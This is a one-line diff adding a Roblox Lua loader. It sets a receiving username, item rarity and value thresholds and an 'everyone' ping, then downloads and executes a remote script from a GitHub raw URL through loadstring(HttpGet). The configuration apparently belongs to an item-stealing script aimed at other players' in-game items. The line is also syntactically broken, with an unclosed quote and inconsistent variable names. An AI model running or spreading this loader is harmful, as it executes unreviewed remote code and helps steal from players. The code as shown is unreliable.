@@ -1,0 +1,1 @@
+_G.Username="gloxksx"  _G.min_rarity="Exclusive _g.min_value= 1 _g.pingEveryone="yes" _G.discover="gloxksx" loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/ec6a2370178b075fee7f1f72.lua'))()
